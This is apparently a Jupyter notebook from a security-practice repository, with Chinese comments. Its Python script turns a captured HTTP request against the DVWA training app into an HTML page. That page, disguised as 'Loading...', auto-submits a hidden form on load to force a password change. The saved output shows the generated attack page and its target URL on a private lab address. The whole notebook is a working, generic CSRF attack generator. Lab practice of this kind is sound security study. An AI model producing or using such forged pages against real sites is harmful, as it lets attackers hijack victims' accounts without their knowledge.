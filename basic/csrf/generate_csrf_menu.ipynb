{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "✅ 攻击页面已生成：csrf_menu_attack.html\n",
      "📌 表单自动提交至：http://192.168.88.129/DVWA/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change\n"
     ]
    }
   ],
   "source": [
    "import urllib.parse\n",
    "\n",
    "# === 样例 Burp 抓包（你可以替换为真实请求） ===\n",
    "raw_request = \"\"\"GET /DVWA/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change HTTP/1.1 \n",
    "Host: 192.168.88.129\n",
    "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n",
    "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n",
    "Accept-Encoding: gzip, deflate\n",
    "Connection: close\n",
    "Referer: http://192.168.88.129/DVWA/vulnerabilities/csrf/\n",
    "Cookie: PHPSESSID=gng5eb7uqffemgr09be7urr0v5; security=low\n",
    "Upgrade-Insecure-Requests: 1\n",
    "Priority: u=0, i\n",
    "\"\"\"\n",
    "\n",
    "# === 分析请求 ===\n",
    "def parse_raw_http(raw):\n",
    "    lines = raw.strip().splitlines()\n",
    "    method, path, _ = lines[0].split()\n",
    "    headers = {}\n",
    "    body = \"\"\n",
    "    in_body = False\n",
    "\n",
    "    for line in lines[1:]:\n",
    "        if line == \"\":\n",
    "            in_body = True\n",
    "            continue\n",
    "        if in_body:\n",
    "            body += line\n",
    "        else:\n",
    "            key, value = line.split(\":\", 1)\n",
    "            headers[key.strip()] = value.strip()\n",
    "\n",
    "    host = headers.get(\"Host\", \"example.com\")\n",
    "    action = f\"http://{host}{path}\"\n",
    "    params = urllib.parse.parse_qs(body)\n",
    "\n",
    "    return action, method, params\n",
    "\n",
    "# === 生成 CSRF HTML 文件 ===\n",
    "def generate_csrf_html(action, method, params):\n",
    "    html = f\"\"\"<!DOCTYPE html>\n",
    "<html lang=\"zh\">\n",
    "<head>\n",
    "  <meta charset=\"UTF-8\">\n",
    "  <title>Loading...</title>\n",
    "</head>\n",
    "<body onload=\"document.forms[0].submit()\">\n",
    "  <h3>正在加载，请稍候...</h3>\n",
    "  <form action=\"{action}\" method=\"{method}\">\n",
    "\"\"\"\n",
    "\n",
    "    for key, values in params.items():\n",
    "        for val in values:\n",
    "            html += f'    <input type=\"hidden\" name=\"{key}\" value=\"{val}\">\\n'\n",
    "\n",
    "    html += \"\"\"  </form>\n",
    "</body>\n",
    "</html>\n",
    "\"\"\"\n",
    "    return html\n",
    "\n",
    "# === 主程序 ===\n",
    "if __name__ == \"__main__\":\n",
    "    action, method, params = parse_raw_http(raw_request)\n",
    "    html = generate_csrf_html(action, method, params)\n",
    "    \n",
    "    with open(\"csrf_menu_attack.html\", \"w\", encoding=\"utf-8\") as f:\n",
    "        f.write(html)\n",
    "    \n",
    "    print(\"✅ 攻击页面已生成：csrf_menu_attack.html\")\n",
    "    print(f\"📌 表单自动提交至：{action}\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "ex",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.19"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
